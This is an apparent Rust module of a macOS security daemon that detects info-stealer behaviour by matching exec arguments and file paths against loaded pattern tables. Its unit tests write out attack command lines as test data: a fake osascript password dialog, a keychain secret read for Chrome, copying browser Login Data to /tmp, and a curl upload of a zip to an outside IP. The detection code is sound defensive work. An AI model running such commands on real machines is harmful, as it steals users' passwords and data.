//! Catalogue of what macOS info-stealers go after (browser credential and cookie stores, the login
//! keychain, crypto wallets, Telegram sessions, Notes, SSH and cloud credentials) and of the Apple
//! tools they drive (`osascript` fake password dialogs, keychain dumps, password checks, staging,
//! exfiltration).
//!
//! The pattern DATA lives in the runtime data file `signatures/heuristics.json` (shipped in the
//! installer, loaded at daemon startup via [`load_from`]) so no Parabellum binary embeds info-stealer
//! signature strings — which would trip XProtect on our own, benign binaries. The matching LOGIC stays
//! here (and in the daemon's behaviour guard). When the file is missing the heuristics are simply
//! disabled (every predicate returns the "nothing of interest" answer) and the daemon keeps running.
//!
//! Shared by the eslogger watcher (cheap pre-filter: which platform-binary `exec`s and which file
//! creations are worth forwarding) and the daemon's behaviour guard (the actual rules). Pure
//! functions over the loaded tables, no I/O once loaded.

use serde::Deserialize;
use std::path::Path;
use std::sync::OnceLock;

/// Behavioural heuristic pattern tables, loaded from `signatures/heuristics.json`.
#[derive(Debug, Clone, Deserialize)]
pub struct Heuristics {
    /// File names that only exist inside a browser / keychain / wallet store.
    #[serde(default)]
    pub sensitive_file_names: Vec<String>,
    /// Path fragments of credential stores (matched case-insensitively against `exec` arguments).
    #[serde(default)]
    pub sensitive_path_fragments: Vec<String>,
    /// Roots (relative to the user's home) where the sensitive files legitimately live.
    #[serde(default)]
    pub legit_store_roots: Vec<String>,
    /// Apple tools whose `exec` the guard inspects (eslogger normally skips platform binaries).
    #[serde(default)]
    pub watched_platform_tools: Vec<String>,
    /// AppleScript hidden-answer (fake password dialog) argument fragments.
    #[serde(default)]
    pub fake_dialog: Vec<String>,
    /// `security` sub-commands that read a stored secret.
    #[serde(default)]
    pub keychain_find_secret: Vec<String>,
    /// `security` sub-commands that dump the keychain.
    #[serde(default)]
    pub keychain_dump: Vec<String>,
    /// Browser "safe storage" keychain item fragments.
    #[serde(default)]
    pub browser_safe_storage: Vec<String>,
    /// `dscl` local password-validation flags.
    #[serde(default)]
    pub password_check: Vec<String>,
}

impl Heuristics {
    /// Parses the JSON content of a heuristics file.
    pub fn from_json(bytes: &[u8]) -> Result<Self, serde_json::Error> {
        serde_json::from_slice(bytes)
    }
}

static ACTIVE: OnceLock<Heuristics> = OnceLock::new();

/// Loads the heuristics from `path`. Returns `true` on success. A missing or malformed file logs a
/// warning and leaves the heuristics disabled; the daemon keeps running. Idempotent: the first
/// successful load wins.
pub fn load_from(path: &Path) -> bool {
    match std::fs::read(path) {
        Ok(bytes) => match Heuristics::from_json(&bytes) {
            Ok(h) => {
                let _ = ACTIVE.set(h);
                true
            }
            Err(e) => {
                tracing::warn!(path = %path.display(), error = %e,
                    "behavioural heuristics file malformed: heuristics disabled");
                false
            }
        },
        Err(e) => {
            tracing::warn!(path = %path.display(), error = %e,
                "behavioural heuristics file missing: heuristics disabled");
            false
        }
    }
}

/// Repo path of the heuristics data file, for tests and tools (resolved from this crate's manifest
/// dir, so it works from any crate's test binary). Embeds only the path, never the signature data.
#[cfg(any(test, feature = "test-util"))]
pub fn repo_heuristics_path() -> std::path::PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../signatures/heuristics.json")
}

/// The active heuristics, or `None` when none were loaded. Under `test`/`test-util` the repo file is
/// auto-loaded so unit tests (in this crate and in the daemon) see the shipped tables.
fn active() -> Option<&'static Heuristics> {
    #[cfg(any(test, feature = "test-util"))]
    {
        // `get_or_init` returns the already-loaded tables when `load_from` ran first.
        Some(ACTIVE.get_or_init(|| {
            let p = repo_heuristics_path();
            let bytes =
                std::fs::read(&p).unwrap_or_else(|e| panic!("reading {}: {e}", p.display()));
            Heuristics::from_json(&bytes).unwrap_or_else(|e| panic!("parsing {}: {e}", p.display()))
        }))
    }
    #[cfg(not(any(test, feature = "test-util")))]
    {
        ACTIVE.get()
    }
}

fn any_contains(patterns: &[String], haystack: &str) -> bool {
    patterns.iter().any(|p| haystack.contains(p.as_str()))
}

// --- pattern groups exposed to the behaviour guard (pb-daemon::guard::rules) ----------------------
// Each returns an empty slice when the heuristics are not loaded, so the guard's rules simply never
// fire (heuristic disabled) rather than matching on literals embedded in the daemon binary.

/// AppleScript hidden-answer (fake password dialog) fragments.
pub fn fake_dialog_patterns() -> &'static [String] {
    active().map(|h| h.fake_dialog.as_slice()).unwrap_or(&[])
}
/// `security` sub-commands that read a stored secret.
pub fn keychain_find_secret_patterns() -> &'static [String] {
    active()
        .map(|h| h.keychain_find_secret.as_slice())
        .unwrap_or(&[])
}
/// `security` sub-commands that dump the keychain.
pub fn keychain_dump_patterns() -> &'static [String] {
    active().map(|h| h.keychain_dump.as_slice()).unwrap_or(&[])
}
/// Browser "safe storage" keychain item fragments.
pub fn browser_safe_storage_patterns() -> &'static [String] {
    active()
        .map(|h| h.browser_safe_storage.as_slice())
        .unwrap_or(&[])
}
/// `dscl` local password-validation flags.
pub fn password_check_patterns() -> &'static [String] {
    active().map(|h| h.password_check.as_slice()).unwrap_or(&[])
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Lower-cased concatenation of the arguments (bounded).
pub fn joined_args(args: &[String]) -> String {
    let mut s = String::new();
    for a in args.iter().skip(1).take(64) {
        if s.len() > 16 * 1024 {
            break;
        }
        s.push_str(&a.to_lowercase());
        s.push(' ');
    }
    s
}

/// Some argument names a credential store.
pub fn args_touch_sensitive(args_lower: &str) -> bool {
    match active() {
        Some(h) => any_contains(&h.sensitive_path_fragments, args_lower),
        None => false,
    }
}

/// Cheap pre-filter: is this platform-binary `exec` worth forwarding to the behaviour guard?
pub fn platform_exec_of_interest(path: &str, args: &[String]) -> bool {
    let Some(h) = active() else {
        return false;
    };
    let name = basename(path);
    if !h.watched_platform_tools.iter().any(|t| t == name) {
        return false;
    }
    let a = joined_args(args);
    match name {
        "osascript" => any_contains(&h.fake_dialog, &a),
        "security" => {
            any_contains(&h.keychain_dump, &a)
                || any_contains(&h.keychain_find_secret, &a)
                || a.contains("export")
        }
        "dscl" => any_contains(&h.password_check, &a),
        "spctl" => a.contains("--master-disable") || a.contains("--global-disable"),
        "killall" => a.contains("terminal"),
        "curl" => is_upload(args),
        "openssl" => a.contains("enc ") && (a.contains("-aes") || a.contains("-chacha")),
        _ => any_contains(&h.sensitive_path_fragments, &a),
    }
}

/// `curl` arguments that send a local file (`-F x=@file`, `--data-binary @file`, `-T file`…). Flags are
/// case-sensitive (`-F` form, `-f` fail).
pub fn is_upload(args: &[String]) -> bool {
    let file_value = |v: &str| v.contains('@') || v.starts_with('<');
    args.iter().enumerate().skip(1).any(|(i, t)| {
        let next = args.get(i + 1).map(String::as_str).unwrap_or("");
        match t.as_str() {
            "-F" | "--form" | "--form-string" | "-d" | "--data" | "--data-binary"
            | "--data-raw" | "--data-urlencode" => file_value(next) && !next.starts_with("http"),
            "-T" | "--upload-file" => !next.is_empty(),
            _ => {
                (t.starts_with("-F") && t.len() > 2 && t.contains('@'))
                    || t.starts_with("--form=") && t.contains('@')
                    || t.starts_with("--data-binary=@")
                    || t.starts_with("--upload-file=")
            }
        }
    })
}

/// Name of a credential-store file (exact match on the last component).
pub fn is_sensitive_file_name(path: &Path) -> bool {
    let Some(h) = active() else {
        return false;
    };
    path.file_name()
        .and_then(|n| n.to_str())
        .map(|n| h.sensitive_file_names.iter().any(|f| f == n))
        .unwrap_or(false)
}

/// The sensitive file sits where its application keeps it (under one of the legit store roots of some
/// user's home, or in a Time Machine / system location).
pub fn is_legit_store_location(path: &Path) -> bool {
    let Some(h) = active() else {
        return false;
    };
    let s = path.to_string_lossy();
    if s.starts_with("/Volumes/") || s.starts_with("/System/") || s.starts_with("/private/var/db/")
    {
        return true;
    }
    let comps: Vec<&str> = s.split('/').collect();
    // /Users/<name>/<rest…>
    if comps.len() < 4 || !comps[0].is_empty() || comps[1] != "Users" {
        return false;
    }
    let rest = comps[3..].join("/");
    h.legit_store_roots
        .iter()
        .any(|r| rest == *r || rest.starts_with(&format!("{r}/")))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn v(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn exec_prefilter() {
        assert!(platform_exec_of_interest(
            "/usr/bin/osascript",
            &v(&[
                "osascript",
                "-e",
                "display dialog \"Mot de passe\" default answer \"\" with hidden answer"
            ])
        ));
        assert!(!platform_exec_of_interest(
            "/usr/bin/osascript",
            &v(&["osascript", "-e", "display notification \"x\""])
        ));
        assert!(platform_exec_of_interest(
            "/usr/bin/security",
            &v(&["security", "find-generic-password", "-wa", "Chrome"])
        ));
        assert!(platform_exec_of_interest(
            "/bin/cp",
            &v(&[
                "cp",
                "/Users/q/Library/Application Support/Google/Chrome/Default/Login Data",
                "/tmp/x/"
            ])
        ));
        assert!(!platform_exec_of_interest(
            "/bin/cp",
            &v(&["cp", "a.txt", "b.txt"])
        ));
        assert!(platform_exec_of_interest(
            "/usr/bin/curl",
            &v(&[
                "curl",
                "-X",
                "POST",
                "-F",
                "file=@/tmp/out.zip",
                "http://198.51.100.7/joinsystem"
            ])
        ));
        assert!(!platform_exec_of_interest(
            "/usr/bin/curl",
            &v(&["curl", "-fsSL", "https://example.com"])
        ));
        assert!(platform_exec_of_interest(
            "/usr/bin/dscl",
            &v(&["dscl", "/Local/Default", "-authonly", "q", "pw"])
        ));
        assert!(!platform_exec_of_interest(
            "/bin/ls",
            &v(&["ls", "/Users/q/Library/Keychains"])
        ));
    }

    #[test]
    fn uploads() {
        assert!(is_upload(&v(&["curl", "-T", "/tmp/a.zip", "https://x"])));
        assert!(is_upload(&v(&[
            "curl",
            "--data-binary",
            "@/tmp/a",
            "https://x"
        ])));
        assert!(is_upload(&v(&["curl", "-Ffile=@/tmp/a.zip", "https://x"])));
        assert!(!is_upload(&v(&["curl", "-d", "{\"a\":1}", "https://x"])));
        assert!(!is_upload(&v(&["curl", "-o", "/tmp/a.zip", "https://x"])));
        assert!(!is_upload(&v(&["curl", "-f", "https://user@host/"])));
    }

    #[test]
    fn store_locations() {
        let legit =
            Path::new("/Users/q/Library/Application Support/Google/Chrome/Default/Login Data");
        assert!(is_sensitive_file_name(legit) && is_legit_store_location(legit));
        let staged = Path::new("/private/tmp/12345/Chrome/Login Data");
        assert!(is_sensitive_file_name(staged) && !is_legit_store_location(staged));
        assert!(!is_legit_store_location(Path::new(
            "/Users/q/Desktop/Cookies"
        )));
        assert!(is_legit_store_location(Path::new(
            "/Users/q/Library/Cookies/Cookies.binarycookies"
        )));
        assert!(!is_sensitive_file_name(Path::new("/tmp/Cookies-journal")));
        assert!(is_legit_store_location(Path::new(
            "/Volumes/Backup/Users/q/Library/Cookies"
        )));
    }

    #[test]
    fn repo_heuristics_file_loads_and_covers_groups() {
        let h = Heuristics::from_json(&std::fs::read(repo_heuristics_path()).unwrap()).unwrap();
        assert!(!h.sensitive_file_names.is_empty());
        assert!(!h.sensitive_path_fragments.is_empty());
        assert!(!h.watched_platform_tools.is_empty());
        assert!(h.fake_dialog.iter().any(|p| p == "hidden answer"));
        assert!(h
            .keychain_find_secret
            .iter()
            .any(|p| p == "find-generic-password"));
        assert!(h.keychain_dump.iter().any(|p| p == "dump-keychain"));
        assert!(h.browser_safe_storage.iter().any(|p| p == "safe storage"));
        assert!(h.password_check.iter().any(|p| p == "-authonly"));
    }
}
